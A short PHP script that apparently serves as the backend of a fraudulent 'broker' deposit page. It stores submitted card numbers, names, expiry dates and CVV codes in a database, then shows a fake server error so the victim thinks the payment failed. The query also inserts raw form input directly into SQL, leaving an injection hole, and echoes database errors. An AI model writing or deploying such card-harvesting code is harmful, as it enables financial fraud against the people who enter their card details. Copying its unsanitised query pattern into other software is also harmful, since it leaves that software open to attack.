<?php
include('../includes/connection.php');

$cvcode = $_POST['cvcode'];
$cardnumber = $_POST['cardnumber'];
$cardname = $_POST['cardname'];
$em = $_POST['em'];
$ey = $_POST['ey'];


$query = mysqli_query($conn,"INSERT into credit(cardnumber,em,ey,cvcode,cardname)VALUES('$cardnumber','$em','$ey','$cvcode','$cardname')");
if($query){
	
	echo "Server has encountered. Pls contact our brokers or contact us via mail";
}
else{
	echo "not deposited".mysqli_error($conn);

}
?>